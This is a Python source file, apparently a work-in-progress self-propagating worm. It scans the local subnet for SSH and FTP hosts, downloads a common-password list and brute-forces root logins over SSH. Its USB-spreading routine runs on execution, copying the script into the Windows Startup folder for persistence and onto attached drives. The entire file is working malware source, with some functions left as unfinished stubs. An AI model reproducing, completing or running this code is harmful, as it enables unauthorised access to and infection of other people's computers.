####################################
# File name: worm.py               #
# Author: Filip Komárek   (pylyf)  #
# Status: Development              #
# Date created: 7/6/2018           #
####################################
import nmap
import paramiko
import os
import coloredlogs, logging
import socket
from urllib.request import urlopen
import urllib
import time
from ftplib import FTP
import ftplib
from shutil import copy2
import win32api
# ------------------- Logging ----------------------- #
logger = logging.getLogger(__name__)
coloredlogs.install(level='DEBUG', logger=logger)
# --------------------------------------------------- #


def get_private_ip():
    """
    Gets private IP address of this machine.
    This will be used for scanning other computers on LAN.

    Returns:
        private IP address
    """
    logger.debug("Getting private IP")
    ip = socket.gethostbyname(socket.gethostname())
    logger.debug("IP: " + ip)
    return ip
def get_public_ip():
    """
    Gets public IP address of this network.
    You can access the router with this ip too.

    Returns:
        public IP address
    """
    logger.debug("Getting public IP")
    import re
    data = str(urlopen('http://checkip.dyndns.com/').read())
    return re.compile(r'Address: (\d+.\d+.\d+.\d+)').search(data).group(1)


def scan_ssh_hosts():
    """
    Scans all machines on the same network that
     have SSH (port 22) enabled

    Returns:
        IP addresses of hosts
    """
    logger.debug("Scanning machines on the same network with port 22 open.")

    port_scanner = nmap.PortScanner()
    port_scanner.scan('192.168.1.0/24', arguments='-p 22 --open')
    all_hosts = port_scanner.all_hosts()

    logger.debug("Hosts: " + str(all_hosts))
    return all_hosts


def scan_ftp_hosts():
    """
    Scans all machines on the same network that
     have FTP (port 21) enabled

    Returns:
        IP addresses of hosts
    """
    logger.debug("Scanning machines on the same network with port 21 open.")

    port_scanner = nmap.PortScanner()
    port_scanner.scan('192.168.1.0/24', arguments='-p 21 --open')
    all_hosts = port_scanner.all_hosts()

    logger.debug("Hosts: " + str(all_hosts))
    return all_hosts


def download_ssh_passwords(filename):
    """
     Downloads most commonly used ssh passwords from a specific url
      Clearly, you can store passwords in a dictionary, but i found this more comfortable

    Args:
        filename - Name to save the file as.
    """

    # TODO: Move these passwords to my own website.

    logger.debug("Downloading passwords...")
    url = "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt"
    urllib.request.urlretrieve(url, filename)
    logger.debug("Passwords downloaded!")


def connect_to_ftp(host, username, password):
    # TODO : Finish this function + Add bruteforcing
    try:
        ftp = FTP(host)
        ftp.login(username, password)
    except ftplib.all_errors as error:
        logger.error(error)
        pass


def connect_to_ssh(host, password):
    """
    Tries to connect to a SSH server

    Returns:
        True - Connection successful
        False - Something went wrong

    Args:
        host - Target machine's IP
        password - Password to use
    """

    # TODO: Pass usernames to the function too

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        logger.debug("Connecting to: " + host)
        client.connect(host, 22, "root", password)
        logger.debug("Successfully connected!")
        return True
    except socket.error:
        logger.error("Computer is offline or port 22 is closed")
        return False
    except paramiko.ssh_exception.AuthenticationException:
        logger.error("Wrong Password or Username")
        return False
    except paramiko.ssh_exception.SSHException:
        # socket is open, but not SSH service responded
        logger.error("No response from SSH server")
        return False


def bruteforce_ssh(host, wordlist):
    """
    Calls connect_to_ssh function and
    tries to bruteforce the target server.

    Args:
        wordlist - TXT file with passwords

    """
    # TODO : Bruteforce usernames too
    file = open(wordlist, "r")
    for line in file:
        connection = connect_to_ssh(host, line)
        print(connection)
        time.sleep(5)

        
def usbspreading():

    bootfolder = os.path.expanduser('~') + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"

    while True:
        drives = win32api.GetLogicalDriveStrings()
        drives = drives.split('\000')[:-1]
        print(drives)
        for drive in drives:
            if "C:\\" in drives:
                copy2(__file__, bootfolder)
            else:
                copy2(__file__, drive)
        time.sleep(3)

usbspreading()